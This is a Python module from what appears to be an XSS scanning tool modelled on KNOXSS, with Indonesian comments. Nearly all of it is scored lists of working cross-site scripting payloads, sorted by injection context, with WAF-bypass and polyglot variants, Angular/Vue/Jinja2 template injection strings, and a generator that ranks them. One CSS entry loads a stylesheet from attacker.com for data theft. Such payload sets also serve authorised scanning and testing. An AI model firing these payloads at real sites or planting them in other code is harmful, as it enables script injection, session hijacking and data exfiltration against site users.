"""
payloads/knoxss_cases.py

KNOXSS-inspired XSS case engine — 50+ kasus XSS spesifik.

KNOXSS kuat karena bukan hanya "inject dan lihat apakah di-reflect" —
dia punya decision tree untuk 50+ kasus berbeda berdasarkan konteks
injection yang sangat spesifik. Ini implementasi open-source-nya.

Cases dikelompokkan per kategori:
  1.  Basic Reflected          — payload langsung di HTML
  2.  Attribute Injection      — di dalam atribut HTML
  3.  JavaScript String        — di dalam string JS
  4.  JavaScript Hoisting      — memanfaatkan JS hoisting
  5.  Quoteless Attribute      — atribut tanpa quote
  6.  Multi-Reflection         — payload di-reflect di banyak tempat
  7.  Path Injection           — di path URL (PHP_SELF, dll)
  8.  Flash Mode Polyglot      — satu payload untuk semua konteks
  9.  XML/SVG Injection        — di dalam XML atau SVG
  10. Script Src Injection     — di src tag script
  11. Markdown Injection       — di render Markdown
  12. Template Engine Bypass   — Angular/Vue expression injection
  13. JSON Callback (JSONP)    — callback function injection
  14. CSS Injection            — via expression() atau URL
  15. Event Handler Injection  — break out ke event handler baru
"""

from typing import List, Tuple
from utils.config import Context

# ─── Type alias ──────────────────────────────────────────────────────────────
Payload = str
Label   = str
Score   = float


class KnoxssCaseEngine:
    """
    Hasilkan payload berdasarkan 50+ kasus XSS spesifik KNOXSS-style.
    Setiap case meng-cover satu situasi injection context yang berbeda.
    """

    # ─── 1. Basic Reflected ──────────────────────────────────────────────────
    BASIC_REFLECTED = [
        # Classic
        ('<script>alert(1)</script>',                          1.00, "basic:script_tag"),
        ('<script>confirm(1)</script>',                        0.95, "basic:confirm"),
        ('<script>prompt(1)</script>',                         0.93, "basic:prompt"),
        # Tag variations
        ('<ScRiPt>alert(1)</sCrIpT>',                         0.90, "basic:case_mix"),
        ('<script >alert(1)</script>',                         0.88, "basic:space_after_tag"),
        ('<script\ttabindex=1>alert(1)</script>',              0.87, "basic:tab_in_tag"),
        ('<script\r\nalert(1)//</script>',                     0.85, "basic:newline_in_script"),
        # Alternative execution
        ('<img src=x onerror=alert(1)>',                      0.99, "basic:img_onerror"),
        ('<img src=x onerror=alert(1) x',                     0.92, "basic:img_unclosed"),
        ('<svg onload=alert(1)>',                              0.98, "basic:svg_onload"),
        ('<body onload=alert(1)>',                             0.95, "basic:body_onload"),
        ('<input autofocus onfocus=alert(1)>',                 0.94, "basic:input_autofocus"),
        ('<details open ontoggle=alert(1)>',                   0.93, "basic:details_ontoggle"),
        ('<video><source onerror=alert(1)></video>',           0.88, "basic:video_source"),
        ('<iframe src=javascript:alert(1)>',                   0.90, "basic:iframe_js"),
        ('<object data=javascript:alert(1)>',                  0.87, "basic:object_data"),
        # Self-closing tricks
        ('<img/src=x/onerror=alert(1)>',                      0.85, "basic:img_slash"),
        ('<img\nsrc=x\nonerror=alert(1)>',                    0.86, "basic:img_newline"),
        # 2025 event handlers
        ('<div style=content-visibility:auto oncontentvisibilityautostatechange=alert(1)>x</div>',
                                                               0.88, "basic:contentvisibility_2025"),
        ('<button popovertarget=x>T</button><div id=x popover onbeforetoggle=alert(1)>',
                                                               0.87, "basic:onbeforetoggle_2025"),
    ]

    # ─── 2. Attribute Injection ──────────────────────────────────────────────
    ATTR_DOUBLE_QUOTE = [
        # Break out of double-quoted attribute
        ('" onerror=alert(1) x="',                            0.99, "attr:dq_onerror"),
        ('" onmouseover=alert(1) x="',                        0.95, "attr:dq_mouseover"),
        ('" onfocus=alert(1) autofocus x="',                  0.94, "attr:dq_focus"),
        ('" onload=alert(1) x="',                             0.93, "attr:dq_onload"),
        ('"><img src=x onerror=alert(1)>',                    0.98, "attr:dq_break_tag"),
        ('"><svg onload=alert(1)>',                           0.97, "attr:dq_svg"),
        ('"><script>alert(1)</script>',                       0.96, "attr:dq_script"),
        ('"onmouseover=alert(1) "',                           0.88, "attr:dq_nospace"),
        (' " onerror=alert(1) "',                             0.86, "attr:dq_space_before"),
    ]

    ATTR_SINGLE_QUOTE = [
        ("' onerror=alert(1) x='",                            0.99, "attr:sq_onerror"),
        ("' onmouseover=alert(1) x='",                        0.95, "attr:sq_mouseover"),
        ("'><img src=x onerror=alert(1)>",                    0.98, "attr:sq_break_tag"),
        ("'><svg onload=alert(1)>",                           0.97, "attr:sq_svg"),
        ("'><script>alert(1)</script>",                       0.96, "attr:sq_script"),
        ("' onfocus=alert(1) autofocus '",                    0.92, "attr:sq_focus"),
    ]

    ATTR_QUOTELESS = [
        # Quoteless attribute injection — spasi memisahkan
        (" onmouseover=alert(1)",                             0.99, "attr:quoteless_mouseover"),
        (" onerror=alert(1)",                                 0.98, "attr:quoteless_onerror"),
        (" onfocus=alert(1) autofocus",                       0.97, "attr:quoteless_focus"),
        (" onload=alert(1)",                                  0.96, "attr:quoteless_onload"),
        ("/onerror=alert(1)",                                 0.88, "attr:quoteless_slash"),
        # Untuk nilai atribut (tanpa tanda kutip sama sekali)
        ("x onmouseover=alert(1) y",                         0.85, "attr:quoteless_inject_mid"),
        ("x><img src=x onerror=alert(1)>",                   0.92, "attr:quoteless_break"),
    ]

    # ─── 3. JavaScript String Context ────────────────────────────────────────
    JS_STRING_DQ = [
        ('";alert(1)//',                                      0.99, "js:dq_break_alert"),
        ('";alert(1);//',                                     0.98, "js:dq_break_comment"),
        ('"-alert(1)-"',                                      0.97, "js:dq_minus_operator"),
        ('"+alert(1)+"',                                      0.96, "js:dq_plus_operator"),
        ('\\"alert(1)//',                                     0.88, "js:dq_backslash"),
        ('</script><script>alert(1)</script>',                0.95, "js:dq_close_reopen"),
        ('";alert(1)//\\"',                                   0.87, "js:dq_complex"),
        ('";window["ale"+"rt"](1)//',                         0.85, "js:dq_string_concat"),
        ('";(0,eval)("alert(1)")//',                          0.88, "js:dq_eval_indirect"),
    ]

    JS_STRING_SQ = [
        ("';alert(1)//",                                      0.99, "js:sq_break_alert"),
        ("';alert(1);//",                                     0.98, "js:sq_break_comment"),
        ("'-alert(1)-'",                                      0.97, "js:sq_minus_operator"),
        ("'+alert(1)+'",                                      0.96, "js:sq_plus_operator"),
        ("\\'alert(1)//",                                     0.88, "js:sq_backslash"),
        ("';window['ale'+'rt'](1)//",                         0.85, "js:sq_concat"),
    ]

    JS_TEMPLATE_LITERAL = [
        # Template literal context
        ('`+alert(1)+`',                                      0.97, "js:template_plus"),
        ('`-alert(1)-`',                                      0.96, "js:template_minus"),
        ('${alert(1)}',                                       0.99, "js:template_expression"),
        ('`}</script><script>alert(1)</script>',              0.90, "js:template_close"),
    ]

    # ─── 4. JavaScript Hoisting ──────────────────────────────────────────────
    # Saat kutip di-escape tapi kode ada sebelum var declaration,
    # JS hoisting memungkinkan kode jalan sebelum deklarasi
    JS_HOISTING = [
        # Inject sebelum var x = "USER_INPUT" → kode sebelum assignment
        ('/alert(1)//\\ ',                                    0.92, "js:hoisting_slash"),
        ('-alert(1)//',                                       0.90, "js:hoisting_minus"),
        # eval injection via toString/valueOf
        ('\\u0022;alert(1)//',                                0.88, "js:hoisting_unicode_dq"),
        ('\\u0027;alert(1)//',                                0.88, "js:hoisting_unicode_sq"),
        # Multiline comment injection
        ('\n*/alert(1)/*\n',                                  0.85, "js:hoisting_comment"),
        # Line terminator injection
        ('\u2028alert(1)//',                                  0.87, "js:hoisting_line_sep"),
        ('\u2029alert(1)//',                                  0.87, "js:hoisting_para_sep"),
    ]

    # ─── 5. Multi-Reflection ─────────────────────────────────────────────────
    # Payload di-reflect di banyak tempat sekaligus
    # Trigger dari parameter pertama tapi memanfaatkan reflection di parameter lain
    MULTI_REFLECTION = [
        # Format: dua param di-inject sekaligus
        # Ini digunakan saat scanner detect dua param reflect bersamaan
        ('"onmouseover=alert(1) "',                           0.95, "multi:dq_event"),
        ("'onmouseover=alert(1) '",                           0.95, "multi:sq_event"),
        # Payload yang bisa jalan di HTML dan JS sekaligus
        ('</script><img src=x onerror=alert(1)>//',           0.93, "multi:html_js_poly"),
        ('";<img src=x onerror=alert(1)>//',                  0.92, "multi:js_html_break"),
    ]

    # ─── 6. Path Injection ───────────────────────────────────────────────────
    # Reflection via PHP_SELF, mod_rewrite, dll
    PATH_INJECTION = [
        # PHP_SELF: /page.php/"><script>alert(1)</script>
        ('/"><script>alert(1)</script>',                      0.95, "path:php_self_script"),
        ("/'><script>alert(1)</script>",                      0.95, "path:php_self_sq"),
        ('/%22><script>alert(1)</script>',                    0.90, "path:php_self_encoded"),
        ('/"><img src=x onerror=alert(1)>',                   0.93, "path:php_self_img"),
        # mod_rewrite injection
        ('"><script>alert(1)</script>',                       0.88, "path:rewrite"),
    ]

    # ─── 7. Flash Mode Polyglot ──────────────────────────────────────────────
    # Payload yang bekerja di SEMUA konteks sekaligus
    FLASH_MODE_POLYGLOT = [
        # Classic polyglot — bekerja di HTML, atribut double/single quote, JS
        (
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */(alert)(1))'
            '//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt'
            '/-!>\\x3csvg/<sVg/oNloAd=alert(1)//>\\x3e',
            0.98, "poly:flash_mode_full"
        ),
        # Shorter polyglot
        ('"\'><img src=x onerror=alert(1)>',                  0.97, "poly:short_triple"),
        ('"\'><script>alert(1)</script>',                     0.96, "poly:short_script"),
        # WAF bypass polyglot
        (
            '"><svg/onload=\nalert(1)>',
            0.92, "poly:svg_newline"
        ),
        (
            '"><script\x09>alert(1)</script>',
            0.90, "poly:script_tab"
        ),
        # Tightest polyglot
        ('"onclick=alert(1)//',                               0.94, "poly:tight"),
        # aneh tapi jalan di banyak parser
        (
            '<!--<img src="--><img src=x onerror=alert(1)//">',
            0.88, "poly:comment_trick"
        ),
    ]

    # ─── 8. XML/SVG Injection ────────────────────────────────────────────────
    XML_SVG = [
        ('<svg><script>alert(1)</script>',                    0.97, "xml:svg_script"),
        ('<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><rect width=100 height=100/></a>',
                                                              0.90, "xml:svg_xlink"),
        ('<svg><animate onbegin=alert(1)>',                   0.92, "xml:svg_animate"),
        ('<svg><set onbegin=alert(1)>',                       0.91, "xml:svg_set"),
        ('<svg><handler xmlns:ev=http://www.w3.org/2001/xml-events ev:event=load>alert(1)</handler>',
                                                              0.87, "xml:svg_handler"),
        # XML CDATA escape
        (']]><script>alert(1)</script>',                      0.88, "xml:cdata_break"),
        ('</description><script>alert(1)</script>',           0.87, "xml:tag_close"),
    ]

    # ─── 9. Script Src / URL Context ─────────────────────────────────────────
    URL_SRC_CONTEXT = [
        ('javascript:alert(1)',                               0.99, "url:js_uri"),
        ('javascript:alert(1)//',                             0.97, "url:js_uri_comment"),
        ('javascript:void(alert(1))',                         0.95, "url:js_void"),
        ('%6aavascript:alert(1)',                             0.88, "url:js_encoded_j"),
        ('data:text/html,<script>alert(1)</script>',          0.93, "url:data_uri_html"),
        ('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                                                              0.90, "url:data_uri_b64"),
        # Protokol dengan unicode
        ('\x01javascript:alert(1)',                           0.85, "url:ctrl_char_prefix"),
        (' javascript:alert(1)',                              0.87, "url:space_prefix"),
    ]

    # ─── 10. JSONP / Callback Injection ──────────────────────────────────────
    JSONP_CALLBACK = [
        # Callback function name injection
        ('alert(1)',                                          0.99, "jsonp:direct_alert"),
        ('alert(1)//',                                       0.98, "jsonp:alert_comment"),
        ('1;alert(1)',                                       0.97, "jsonp:semicolon"),
        ('a=1,alert(1)',                                     0.96, "jsonp:comma_op"),
        ('-alert(1)-',                                       0.95, "jsonp:minus"),
        ('+alert(1)+',                                       0.94, "jsonp:plus"),
        ('*/alert(1)/*',                                     0.90, "jsonp:comment_break"),
        ('</script><svg onload=alert(1)>',                   0.88, "jsonp:html_break"),
    ]

    # ─── 11. CSS Injection ───────────────────────────────────────────────────
    CSS_INJECTION = [
        # Modern CSS injection techniques
        ('</style><script>alert(1)</script>',                 0.97, "css:close_style"),
        ('</style><img src=x onerror=alert(1)>',              0.96, "css:close_img"),
        # CSS expression (IE legacy, masih ada di beberapa app)
        ('expression(alert(1))',                              0.85, "css:expression"),
        # URL injection dalam CSS
        ('url(javascript:alert(1))',                          0.87, "css:url_js"),
        # Import injection
        ('@import "javascript:alert(1)"',                     0.82, "css:import"),
        # Custom property exfil (untuk data theft via CSS)
        ('</style><link rel=stylesheet href=//attacker.com/steal.css>',
                                                              0.80, "css:import_external"),
    ]

    # ─── 12. Markdown / Template Engine ──────────────────────────────────────
    MARKDOWN_TEMPLATE = [
        # Markdown link injection
        ('[XSS](javascript:alert(1))',                        0.95, "md:link_js"),
        ('![XSS](javascript:alert(1))',                      0.93, "md:img_js"),
        # Angular expression injection
        ('{{constructor.constructor("alert(1)")()}}',         0.95, "tmpl:angular_constructor"),
        ('{{$on.constructor("alert(1)")()}}',                 0.93, "tmpl:angular_on_ctor"),
        ('{{"a".constructor.prototype.charAt=[].join;$eval("x=1} } alert(1)//")}}',
                                                              0.88, "tmpl:angular_proto"),
        # Vue injection
        ('{{_c.constructor("alert(1)")()}}',                  0.90, "tmpl:vue_constructor"),
        ('{{constructor.constructor("alert(1)")()}}',         0.90, "tmpl:vue_global"),
        # Jinja2/Twig (if reflected in template)
        ("{{''.__class__.__mro__[1].__subclasses__()}}",      0.85, "tmpl:jinja2_class"),
    ]

    def generate(
        self,
        context: str = "html",
        top_n:   int = 100,
    ) -> List[Tuple[Payload, Score, Label]]:
        """
        Hasilkan payload berdasarkan konteks.
        context: "html" | "attr_dq" | "attr_sq" | "attr_quoteless" |
                 "js_dq" | "js_sq" | "js_template" | "url" | "css" |
                 "xml" | "jsonp" | "markdown" | "all"
        """
        pool: List[Tuple[Payload, Score, Label]] = []

        ctx = context.lower()
        if ctx in ("html", "all"):
            pool += [(p, s, l) for p, s, l in self.BASIC_REFLECTED]
            pool += [(p, s, l) for p, s, l in self.FLASH_MODE_POLYGLOT]
            pool += [(p, s, l) for p, s, l in self.XML_SVG]

        if ctx in ("attr", "attr_dq", "all"):
            pool += [(p, s, l) for p, s, l in self.ATTR_DOUBLE_QUOTE]

        if ctx in ("attr", "attr_sq", "all"):
            pool += [(p, s, l) for p, s, l in self.ATTR_SINGLE_QUOTE]

        if ctx in ("attr", "attr_quoteless", "all"):
            pool += [(p, s, l) for p, s, l in self.ATTR_QUOTELESS]

        if ctx in ("js", "js_dq", "all"):
            pool += [(p, s, l) for p, s, l in self.JS_STRING_DQ]
            pool += [(p, s, l) for p, s, l in self.JS_HOISTING]

        if ctx in ("js", "js_sq", "all"):
            pool += [(p, s, l) for p, s, l in self.JS_STRING_SQ]
            pool += [(p, s, l) for p, s, l in self.JS_HOISTING]

        if ctx in ("js", "js_template", "all"):
            pool += [(p, s, l) for p, s, l in self.JS_TEMPLATE_LITERAL]

        if ctx in ("url", "src", "all"):
            pool += [(p, s, l) for p, s, l in self.URL_SRC_CONTEXT]

        if ctx in ("css", "all"):
            pool += [(p, s, l) for p, s, l in self.CSS_INJECTION]

        if ctx in ("xml", "svg", "all"):
            pool += [(p, s, l) for p, s, l in self.XML_SVG]

        if ctx in ("jsonp", "callback", "all"):
            pool += [(p, s, l) for p, s, l in self.JSONP_CALLBACK]

        if ctx in ("markdown", "template", "all"):
            pool += [(p, s, l) for p, s, l in self.MARKDOWN_TEMPLATE]

        if ctx in ("path", "all"):
            pool += [(p, s, l) for p, s, l in self.PATH_INJECTION]

        if ctx in ("multi", "all"):
            pool += [(p, s, l) for p, s, l in self.MULTI_REFLECTION]

        # If context unknown, return all
        if not pool:
            return self.generate("all", top_n)

        # Deduplicate by payload text
        seen: set = set()
        deduped = []
        for p, s, l in pool:
            if p not in seen:
                seen.add(p)
                deduped.append((p, s, l))

        # Sort by score descending, take top_n
        deduped.sort(key=lambda x: x[1], reverse=True)
        return deduped[:top_n]

    def generate_for_all_contexts(
        self, top_n_per_ctx: int = 10
    ) -> List[Tuple[Payload, Score, Label]]:
        """
        Hasilkan payload terbaik untuk setiap konteks.
        Berguna saat konteks belum diketahui.
        """
        contexts = [
            "html", "attr_dq", "attr_sq", "attr_quoteless",
            "js_dq", "js_sq", "js_template",
            "url", "css", "xml", "jsonp", "path",
        ]
        all_payloads = []
        seen: set = set()
        for ctx in contexts:
            for p, s, l in self.generate(ctx, top_n_per_ctx):
                if p not in seen:
                    seen.add(p)
                    all_payloads.append((p, s, l))
        all_payloads.sort(key=lambda x: x[1], reverse=True)
        return all_payloads

    @property
    def total(self) -> int:
        """Total payload unik di semua kategori."""
        return len(self.generate("all", top_n=99999))
